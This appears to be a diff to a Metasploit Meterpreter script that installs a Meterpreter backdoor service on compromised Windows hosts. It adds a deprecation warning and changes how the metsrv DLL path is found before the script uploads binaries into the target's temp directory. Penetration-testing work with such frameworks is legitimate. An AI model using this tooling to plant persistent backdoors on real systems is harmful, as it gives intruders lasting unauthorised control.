@@ -1,3 +1,11 @@
+##
+# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
+# If you'd like to imporve this script, please try to port it as a post
+# module instead. Thank you.
+##
+
+
+
 #
 # Meterpreter script for installing the meterpreter service
 #
@@ -84,7 +92,8 @@ if client.platform =~ /win32|win64/
     to ||= from
     print_status(" >> Uploading #{from}...")
     fd = client.fs.file.new(tempdir + "\\" + to, "wb")
-    fd.write(::File.read(File.join(based, from), ::File.size(::File.join(based, from))))
+    path = (from == 'metsrv.x86.dll') ? MeterpreterBinaries.path('metsrv','x86.dll') : File.join(based, from)
+    fd.write(::File.read(path, ::File.size(path)))
     fd.close
   end
 
